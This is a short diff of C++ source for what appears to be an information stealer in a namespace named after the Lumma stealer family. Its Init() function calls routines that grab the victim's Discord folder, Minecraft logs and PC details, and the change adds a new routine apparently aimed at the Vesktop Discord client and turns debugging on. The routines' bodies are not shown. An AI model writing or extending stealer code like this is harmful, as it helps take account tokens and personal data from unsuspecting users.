@@ -19,9 +19,10 @@ some code is copy and pasted from junipermatcha
 
 namespace Lumma {
     void Init() {
-        //Debug::Initialize();
+        Debug::Initialize();
         
         grab::GetDiscordFolder();
+        grab::GetVesktop();
         grab::getMinecraftLogs();
         grab::GetPCInfo();
 
